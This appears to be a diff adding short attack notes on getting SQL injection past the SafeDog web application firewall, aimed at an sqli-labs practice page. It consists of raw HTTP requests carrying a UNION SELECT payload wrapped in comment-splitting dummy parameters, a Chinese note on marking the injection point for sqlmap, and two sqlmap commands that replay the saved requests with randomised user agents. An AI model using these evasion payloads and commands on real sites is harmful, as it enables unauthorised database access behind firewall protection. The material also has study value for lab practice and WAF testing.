@@ -1,0 +1,23 @@
+GET /Less-1/?a=%2f%2a&id=-1'%20union%20select%201,2,user()%20--+&b=%2a%2f HTTP/1.1
+Host: www.sqli.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+GET /Less-1/?a=%2f%2a&id=*--+&b=%2a%2f HTTP/1.1
+Host: www.sqli.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+将payload 设置为* 这样sqlmap就会提前测试该位置
+
+python sqlmap.py -r "C:\Users\Administrator\Desktop\过狗脚本\安全狗\data2.txt" -p id --random-agent --flush-session
+
+python sqlmap.py -r "C:\Users\Administrator\Desktop\过狗脚本\安全狗\data3.txt" -p id --random-agent --flush-session
